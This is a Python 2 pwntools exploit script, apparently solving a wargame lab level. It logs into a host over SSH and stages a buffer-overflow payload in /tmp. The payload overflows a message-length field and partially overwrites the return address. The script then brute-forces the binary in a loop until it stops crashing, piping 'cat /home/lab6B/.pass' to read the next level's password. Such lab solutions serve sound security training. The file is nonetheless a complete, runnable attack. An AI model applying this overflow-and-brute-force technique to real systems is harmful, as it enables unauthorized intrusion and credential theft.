#!/usr/bin/python
import sys
from pwn import *

USERNAME=""
PASSWORD=""
HOST=""
FILE=""

def connect_remote(username, password, host):
    try:
        s = ssh(host=host, user=username, password=password)
    except:
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s

if __name__ == "__main__":
    p = connect_remote(USERNAME, PASSWORD, HOST)
    shell = p.run("sh")

    print "PID: %d" % (p.pid)

    # overflow msglen size
    username = "A"*40 + "\xc6"
    #overwrite EIP @196
    tweet = "A"*196 + "\x2b\x07"

    payload = username + "\n"
    payload += tweet

    print "[!] Sending stage \"/tmp/payload\""
    stage = "echo \"%s\" > /tmp/payload" % payload
    shell.sendline(stage)

    c = "while true; do (cat /tmp/payload; echo \"cat /home/lab6B/.pass\") | %s; done" % (FILE)
    i = 1

    while True:
        print "[!] Attempt: %d" % (i)
        i+=1

        shell.sendline(c)
        shell.recvuntil("sent!\n",timeout=0.5)
        buff = shell.recvline(timeout=0.5)

        if "core dumped" not in buff:
            print buff
            break

    shell.sendline("rm /tmp/payload")
    shell.close()
